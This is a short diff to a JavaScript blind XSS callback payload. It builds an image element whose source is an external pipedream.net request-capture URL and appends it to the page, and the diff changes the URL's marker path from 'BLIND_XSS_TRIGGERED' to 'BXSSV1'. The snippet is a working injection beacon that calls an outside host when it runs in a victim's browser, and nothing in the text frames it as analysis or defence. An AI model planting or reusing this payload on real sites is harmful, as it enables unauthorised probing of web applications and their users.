@@ -1,6 +1,6 @@
 try {
   var elem = document.createElement('img');
-elem.src = 'https://en90slubioxb.x.pipedream.net/BLIND_XSS_TRIGGERED';
+elem.src = 'https://en90slubioxb.x.pipedream.net/BXSSV1';
 document.body.appendChild(elem);
   
   //https://stackoverflow.com/a/6169703
